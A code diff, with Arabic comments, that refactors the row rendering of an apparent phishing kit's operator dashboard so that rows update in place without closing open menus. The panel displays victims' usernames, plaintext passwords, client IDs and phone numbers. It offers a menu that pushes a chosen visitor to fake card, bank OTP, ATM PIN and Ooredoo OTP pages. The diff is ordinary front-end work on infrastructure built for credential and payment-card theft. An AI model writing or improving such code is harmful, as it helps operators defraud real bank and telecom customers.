@@ -149,9 +149,9 @@ $v = time(); // Version to bust cache
 
         async function loadData() {
             try {
-                // منع التحديث إذا كانت هناك قائمة مفتوحة أو بحث نشط
+                // الآن لا نحتاج لمنع التحديث، التحديث أصبح ذكياً ويحافظ على القائمة
                 const isSearching = document.getElementById('srch').value.length > 0;
-                if (isMenuOpen || isSearching) return;
+                if (isSearching) return;
 
                 const [b, s] = await Promise.all([
                     fetch('../api/admin/bookings.php?v=<?= $v ?>').then(r => r.json()),
@@ -170,19 +170,31 @@ $v = time(); // Version to bust cache
         }
 
         function renderRows(list) {
-            document.getElementById('tBody').innerHTML = list.map(r => `
-                <tr>
+            const tBody = document.getElementById('tBody');
+            
+            list.forEach(r => {
+                let row = document.getElementById(`row-${r.referenceId}`);
+                
+                // إذا كان الصف غير موجود، نقوم بإنشائه لأول مرة
+                if (!row) {
+                    row = document.createElement('tr');
+                    row.id = `row-${r.referenceId}`;
+                    tBody.appendChild(row);
+                }
+
+                // تحديث محتوى الصف مع الحفاظ على القائمة المنسدلة إذا كانت مفتوحة
+                const statusBadgeClass = `badge badge-${r.status === 'بطاقة' ? 'card' : (r.status === 'OTP' ? 'otp' : (r.status === 'ATM' ? 'atm' : (r.status === 'Ooredoo' ? 'ooredoo' : (r.status === 'OTP Ooredoo' ? 'otp-ooredoo' : r.status))))}`;
+                const statusText = r.status === 'waiting' ? 'بانتظار القرار' : (r.status === 'approved' ? 'مقبول' : (r.status === 'rejected' ? 'مرفوض' : r.status));
+
+                // تحديث الخلايا فقط دون المسح الكامل
+                row.innerHTML = `
                     <td><span style="font-weight: 600;">${r.country}</span></td>
                     <td><b>${r.username}</b></td>
                     <td><code>${r.password || '••••••••'}</code></td>
                     <td>${r.clientId}</td>
                     <td>${r.clientPhone}</td>
                     <td><span style="color: #888; font-size: 11px;">${r.last_activity || '-'}</span></td>
-                    <td>
-                        <span class="badge badge-${r.status === 'بطاقة' ? 'card' : (r.status === 'OTP' ? 'otp' : (r.status === 'ATM' ? 'atm' : (r.status === 'Ooredoo' ? 'ooredoo' : (r.status === 'OTP Ooredoo' ? 'otp-ooredoo' : r.status))))}">
-                            ${r.status === 'waiting' ? 'بانتظار القرار' : (r.status === 'approved' ? 'مقبول' : (r.status === 'rejected' ? 'مرفوض' : r.status))}
-                        </span>
-                    </td>
+                    <td><span class="${statusBadgeClass}">${statusText}</span></td>
                     <td>
                         <div style="display: flex; gap: 5px;">
                             <button class="action-btn" onclick="openDetail('${r.referenceId}')"><i class="bi bi-eye"></i> تفاصيل</button>
@@ -190,7 +202,7 @@ $v = time(); // Version to bust cache
                                 <button class="action-btn" style="background: #6c757d;" onclick="toggleRedirectMenu('${r.referenceId}')">
                                     <i class="bi bi-arrow-right-circle"></i> توجيه
                                 </button>
-                                <div id="menu-${r.referenceId}" class="redirect-menu" style="display: none; position: absolute; left: 0; top: 100%; background: white; border: 1px solid #ddd; border-radius: 5px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); z-index: 100; min-width: 150px; padding: 5px 0;">
+                                <div id="menu-${r.referenceId}" class="redirect-menu" style="display: ${document.getElementById(`menu-${r.referenceId}`)?.style.display || 'none'}; position: absolute; left: 0; top: 100%; background: white; border: 1px solid #ddd; border-radius: 5px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); z-index: 100; min-width: 150px; padding: 5px 0;">
                                     <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'payment.php')">صفحة البطاقة</div>
                                     <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'otp.php')">صفحة OTP البنك</div>
                                     <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'pin.php')">صفحة ATM PIN</div>
@@ -202,8 +214,14 @@ $v = time(); // Version to bust cache
                             </div>
                         </div>
                     </td>
-                </tr>
-            `).join('');
+                `;
+            });
+
+            // إزالة الصفوف التي لم تعد موجودة في البيانات (اختياري)
+            const currentIds = list.map(r => `row-${r.referenceId}`);
+            Array.from(tBody.rows).forEach(row => {
+                if (!currentIds.includes(row.id)) row.remove();
+            });
         }
 
         function filterRows() {
